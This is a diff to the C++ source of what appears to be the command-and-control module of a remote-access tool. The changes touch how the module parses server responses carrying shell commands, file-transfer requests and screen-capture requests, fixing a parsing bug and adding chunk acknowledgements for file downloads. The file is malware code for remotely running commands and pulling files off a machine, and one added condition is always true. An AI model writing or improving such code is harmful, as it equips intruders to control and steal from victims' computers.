@@ -203,15 +203,17 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                 }                            
 
                 case shellRequest:
-                {
+                    {
                     this->printParsedResponse(resData, "SEHLL_REQUEST");
                     std::istringstream spliter(data);
                     std::string tmp;
 
                     while (std::getline(spliter, tmp, ';')) {
-                        if (strncmp(tmp.c_str(), "file ", 5)) {
+                        if (!strncmp(tmp.c_str(), "file ", 5)) {
                             this->ftpPath = StringUtil::split(tmp, ' ')[1];
+                            std::cout << this->ftpPath << std::endl;
                             this->sendData(ftpRequest, this->ftpPath.length(), (LPVOID)this->ftpPath.c_str());
+                            this->sendData(ftpRequest, FTP_REQ_DATA_LEN, FTP_REQ_DATA);
                         }
                         else {
                             this->shellCmd.push_back(tmp);
@@ -249,6 +251,7 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
 
                 case ftpResponse:
                 {
+                    this->printParsedResponse(resData, "FTP_RESPONSE");
                     std::thread ftpHandler = std::thread(&cncManager::handleFtpResponse, this, data, resData->seq);
                     ftpHandler.detach();
                 }
@@ -301,9 +304,13 @@ void cncManager::handleFtpRequest(std::string path) {
     commander.getFile(path,this->server);
 }
 
-void cncManager::handleFtpResponse(std::string& data, DWORD seq) {
+void cncManager::handleFtpResponse(std::string data, DWORD seq) {
     commandManager commander;
-    commander.saveFIle(this->ftpPath, data, seq);
+    commander.saveFile(this->ftpPath, data, seq);
+
+    if (seq != NOT_SPLITED_SEQ || seq != LAST_SPLITED_SEQ) {
+        this->sendData(ftpRequest, FTP_REQ_DATA_LEN, FTP_REQ_DATA);
+    }
 }
 
 void cncManager::handleScreenRequest() {
